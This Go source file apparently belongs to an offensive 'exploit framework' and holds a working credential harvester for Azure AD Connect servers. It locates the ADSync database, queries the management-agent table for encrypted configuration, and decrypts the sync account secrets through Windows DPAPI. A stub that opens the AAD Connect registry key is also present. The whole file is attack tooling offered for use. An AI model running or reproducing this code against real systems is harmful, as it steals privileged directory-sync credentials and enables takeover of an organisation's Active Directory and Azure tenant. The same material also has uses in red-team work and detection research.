//go:build windows

package cloud

import (
	"context"
	"database/sql"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

// harvestAADConnect extracts Azure AD Connect sync credentials.
// Requires local admin on the AAD Connect server.
// Windows-only: reads the ADSync database and decrypts with DPAPI.
func harvestAADConnect(_ context.Context) *pb.CloudHarvestResult {
	result := &pb.CloudHarvestResult{
		Provider: "azure",
		Method:   "adconnect",
	}

	// Locate AAD Connect database
	programData := os.Getenv("PROGRAMDATA")
	if programData == "" {
		programData = `C:\ProgramData`
	}

	dbPath := filepath.Join(programData, "ADSync", "Data", "ADSync.mdf")
	localDBPath := filepath.Join(programData, "Microsoft", "Azure AD Connect", "ADSync.mdf")

	// Try the LocalDB connection string used by AAD Connect
	connStrings := []string{
		`server=(localdb)\.\ADSync;database=ADSync;trusted_connection=yes`,
		`server=(localdb)\.\MicrosoftAzureADConnect;database=ADSync;trusted_connection=yes`,
	}

	found := false

	// Check if database files exist
	for _, path := range []string{dbPath, localDBPath} {
		if _, err := os.Stat(path); err == nil {
			result.Metadata = fmt.Sprintf("AAD Connect database found: %s", path)
			found = true
			break
		}
	}

	// Try to extract from LocalDB
	for _, connStr := range connStrings {
		creds, err := extractADSyncCreds(connStr)
		if err != nil {
			continue
		}
		result.Credentials = append(result.Credentials, creds...)
		found = true
		break
	}

	// Try reading encrypted config from registry
	if regCreds := readADSyncRegistry(); regCreds != nil {
		result.Credentials = append(result.Credentials, regCreds...)
		found = true
	}

	if !found {
		return nil
	}
	return result
}

func extractADSyncCreds(connStr string) ([]*pb.CloudCredential, error) {
	dbConn, err := sql.Open("sqlserver", connStr)
	if err != nil {
		// M4: Log connection failures for debugging
		return nil, fmt.Errorf("ADSync DB connection failed: %w", err)
	}
	defer dbConn.Close()

	// M3: Add timeout context to SQL query to prevent hanging
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	rows, err := dbConn.QueryContext(ctx, `
		SELECT private_configuration_xml, encrypted_configuration
		FROM mms_management_agent
		WHERE ma_type = 'AD'
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var creds []*pb.CloudCredential
	for rows.Next() {
		var privateXML, encryptedConfig string
		if err := rows.Scan(&privateXML, &encryptedConfig); err != nil {
			continue
		}

		// Decrypt the encrypted configuration using DPAPI
		encBytes, err := hex.DecodeString(encryptedConfig)
		if err != nil {
			continue
		}

		decrypted, err := dpAPIDecrypt(encBytes)
		if err != nil {
			continue
		}

		creds = append(creds, &pb.CloudCredential{
			Provider: "azure",
			CredType: "adconnect_sync",
			Identity: "Azure AD Connect Sync Account",
			Secret:   string(decrypted),
			Source:   "adsync_database",
		})
	}

	return creds, nil
}

func readADSyncRegistry() []*pb.CloudCredential {
	// Try to read encrypted configuration from registry
	// HKLM\SOFTWARE\Microsoft\Azure AD Connect\
	var key syscall.Handle
	err := syscall.RegOpenKeyEx(
		syscall.HKEY_LOCAL_MACHINE,
		syscall.StringToUTF16Ptr(`SOFTWARE\Microsoft\Azure AD Connect`),
		0,
		syscall.KEY_READ,
		&key,
	)
	if err != nil {
		return nil
	}
	defer syscall.RegCloseKey(key)

	return nil // Registry values require further parsing
}

var (
	crypt32          = syscall.NewLazyDLL("crypt32.dll")
	procUnprotect    = crypt32.NewProc("CryptUnprotectData")
)

type cryptoAPIBlob struct {
	DataLen uint32
	Data    *byte
}

func dpAPIDecrypt(data []byte) ([]byte, error) {
	inBlob := cryptoAPIBlob{
		DataLen: uint32(len(data)),
		Data:    &data[0],
	}
	var outBlob cryptoAPIBlob

	ret, _, err := procUnprotect.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}

	// C4: Check for nil pointer before unsafe.Slice to prevent crash
	if outBlob.Data == nil || outBlob.DataLen == 0 {
		return nil, fmt.Errorf("CryptUnprotectData returned empty result")
	}

	result := make([]byte, outBlob.DataLen)
	copy(result, unsafe.Slice(outBlob.Data, outBlob.DataLen))

	// Free the allocated memory
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	localFree := kernel32.NewProc("LocalFree")
	localFree.Call(uintptr(unsafe.Pointer(outBlob.Data)))

	return result, nil
}
